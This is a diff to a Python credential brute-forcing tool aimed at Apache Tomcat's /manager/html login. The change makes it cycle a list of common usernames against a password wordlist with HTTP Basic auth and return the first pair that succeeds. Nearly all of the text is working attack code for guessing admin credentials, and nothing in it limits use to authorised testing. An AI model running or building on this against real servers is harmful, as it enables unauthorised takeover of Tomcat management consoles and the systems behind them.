@@ -46,22 +46,25 @@ def brute(url: str, userlist: str, wordlist: str) -> tuple[str, str] | bool:
             length_wordlist = len(open_wordlist.readlines())
 
             with Progress(*progress_bar.columns, transient=True) as progress:
-                task = progress.add_task(description="[violet] Brute force...", total=length_wordlist)
+                task = progress.add_task(description="[violet] Brute force...",
+                                         total=length_wordlist*len(common_username))
 
-                # Reset file pointer
-                open_wordlist.seek(0)
-                for password in open_wordlist:
-                    password = password.strip()  # remove space or bad space
-                    auth = HTTPBasicAuth('tomcat', password)
-                    response = requests.get(f"{url}/manager/html", auth=auth)
+                for username in common_username:
+                    # Reset file pointer
+                    open_wordlist.seek(0)
 
-                    # TODO : add an option --continue-on-success
-                    if response.status_code == 200:
-                        progress.update(task, completed=length_wordlist)
-                        time.sleep(1)
-                        return 'tomcat', password
-                    else:
-                        progress.advance(task)
+                    for password in open_wordlist:
+                        password = password.strip()  # remove space or bad space
+                        auth = HTTPBasicAuth(username, password)
+                        response = requests.get(f"{url}/manager/html", auth=auth)
+
+                        # TODO : add an option --continue-on-success
+                        if response.status_code == 200:
+                            progress.update(task, completed=length_wordlist)
+                            time.sleep(1)
+                            return username, password
+                        else:
+                            progress.advance(task)
 
     # with user list
     else:
